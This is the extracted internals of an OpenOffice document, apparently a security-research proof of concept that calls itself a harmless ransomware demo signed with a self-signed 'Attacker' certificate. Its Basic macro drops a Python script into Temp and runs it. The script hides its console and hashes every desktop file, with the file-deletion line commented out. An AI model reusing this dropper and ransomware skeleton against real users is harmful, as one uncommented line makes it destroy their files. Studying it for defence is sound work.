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document contains a harmless ransomware macro created by Attacker! The macro creates hash files of all files on your desktop, but does not delete any file!</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Macros were signed by Attacker using a self-signed certificate / private ke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2T18:30:33.03</meta:creation-date>
    <dc:date>2021-10-12T18:32:00.54</dc:date>
    <meta:editing-duration>PT1M27S</meta:editing-duration>
    <meta:editing-cycles>3</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.8$Win32 OpenOffice.org_project/418m3$Build-9803</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="2" meta:word-count="39" meta:character-count="23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	Dim oSFA As Object, oOutStream as Object, oOutText as Object
	Dim sFilePath as String
	
	oSFA = createUNOService ("com.sun.star.ucb.SimpleFileAccess")
	sFilePath = "C:\Users\" + environ("USERNAME") + "\AppData\Local\Temp\example_ransomware.py"
	If oSFA.exists(sFilePath) Then
		oSFA.kill(sFilePath) 'if file exists, delete it
	End If
	
	oOutStream = oSFA.openFileWrite(sFilePath)
	oOutText = createUNOService ("com.sun.star.io.TextOutputStream")
	oOutText.setOutputStream(oOutStream)
	
	oOutText.WriteString("import os" + Chr(13) + Chr(10))
	oOutText.WriteString("import getpass" + Chr(13) + Chr(10))
	oOutText.WriteString("import hashlib" + Chr(13) + Chr(10))
	oOutText.WriteString("import ctypes" + Chr(13) + Chr(10))
	oOutText.WriteString("ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )" + Chr(13) + Chr(10))
	oOutText.WriteString("" + Chr(13) + Chr(10))
	oOutText.WriteString("def hash_and_remove(file):" + Chr(13) + Chr(10))
	oOutText.WriteString("	with open(file, 'rb') as f:" + Chr(13) + Chr(10))
	oOutText.WriteString("		fblock = f.read(block_size)" + Chr(13) + Chr(10))
	oOutText.WriteString("		while len(fblock) &gt; 0:" + Chr(13) + Chr(10))
	oOutText.WriteString("			hash_obj.update(fblock)" + Chr(13) + Chr(10))
	oOutText.WriteString("			fblock = f.read(block_size)" + Chr(13) + Chr(10))
	oOutText.WriteString("	file_hashed = open(file + '.hashed','w')" + Chr(13) + Chr(10))
	oOutText.WriteString("	file_hashed.write(hash_obj.hexdigest())" + Chr(13) + Chr(10))
	oOutText.WriteString("	file_hashed.close()" + Chr(13) + Chr(10))
	oOutText.WriteString("#	os.remove(file)" + Chr(13) + Chr(10))
	oOutText.WriteString("" + Chr(13) + Chr(10))
	oOutText.WriteString("username = getpass.getuser()" + Chr(13) + Chr(10))
	oOutText.WriteString("path = 'C:\\Users\\' + username + '\\Desktop\\'" + Chr(13) + Chr(10))
	oOutText.WriteString("hash_obj = hashlib.sha256()" + Chr(13) + Chr(10))
	oOutText.WriteString("block_size = 65536" + Chr(13) + Chr(10))
	oOutText.WriteString("for root, dirs, files in os.walk(path):" + Chr(13) + Chr(10))
	oOutText.WriteString("	for file in files:" + Chr(13) + Chr(10))
	oOutText.WriteString("		file = path + file" + Chr(13) + Chr(10))
	oOutText.WriteString("		try:" + Chr(13) + Chr(10))
	oOutText.WriteString("			hash_and_remove(file)" + Chr(13) + Chr(10))
	oOutText.WriteString("		except:" + Chr(13) + Chr(10))
	oOutText.WriteString("			pass" + Chr(13) + Chr(10))

	Shell("C:\Program Files (x86)\OpenOffice 4\program\python.exe " + sFilePath)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8c0024002a007b000b0065004b007900800000004400ae0059002f00960057">
    <SignedInfo>
      <CanonicalizationMethod Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/>
      <SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
      <Reference URI="Basic/Standard/script-lb.xml">
        <Transforms>
          <Transform Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/>
        </Transforms>
        <DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
        <DigestValue>F4Yo8KatAudgCClcvASy4fI9g0Q=</DigestValue>
      </Reference>
      <Reference URI="Basic/Standard/Module1.xml">
        <Transforms>
          <Transform Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/>
        </Transforms>
        <DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
        <DigestValue>BZOhdKi5C6IyL0vajAKMhEAoDY0=</DigestValue>
      </Reference>
      <Reference URI="Basic/script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#ID_0059000a00d0008200230027004600dd0083005f009a00530028005c000000dc">
        <DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
        <DigestValue>D/WUcMxHQBAbyb++a1DhET3Vtq0=</DigestValue>
      </Reference>
    </SignedInfo>
    <SignatureValue>A4UTct9FLfNX2cwsDOmBX504V41bJ+VDnIV56RVVJz+h52nhGoWD6ZarOaE9SxY3
efjzpI/6KNlxIudYVjl/Z+VuovIqyj6wxnYeGE/KuAW2oPOfqjqFvzGizyVWQY5J
zARzWYw8SpU7prhP/RDnoTJ5iK3Xz+f/M4dpOpZxEKgAiRWWhzmoUu+ZrRBI+4Qe
EroGrhjSy+Lr3iRzKlIhwtPHNU9KuqQs9PbYCoa7moJxJiauOOhP33aYiVK0br6B
PrRGaVMUJdawiRJEDhUqZEemFMrK9jG8z/qlP04IVafbufJN2v4o6bpwB9ByMYfE
fLyd7Kexi0af62hV5ROXSQ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  <X509Data>
        <X509IssuerSerial>
          <X509IssuerName>C=DE, E=attacker@odf.evil, CN=Attacker</X509IssuerName>
          <X509SerialNumber>561695420339045612699057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59000a00d0008200230027004600dd0083005f009a00530028005c000000dc" Target="#ID_008c0024002a007b000b0065004b007900800000004400ae0059002f00960057">
          <dc:date xmlns:dc="http://purl.org/dc/elements/1.1/">2021-10-12T18:34:31,37</dc:date>
        </SignatureProperty>
      </SignatureProperties>
    </Object>
  </Signature>
</document-signatures>
</file>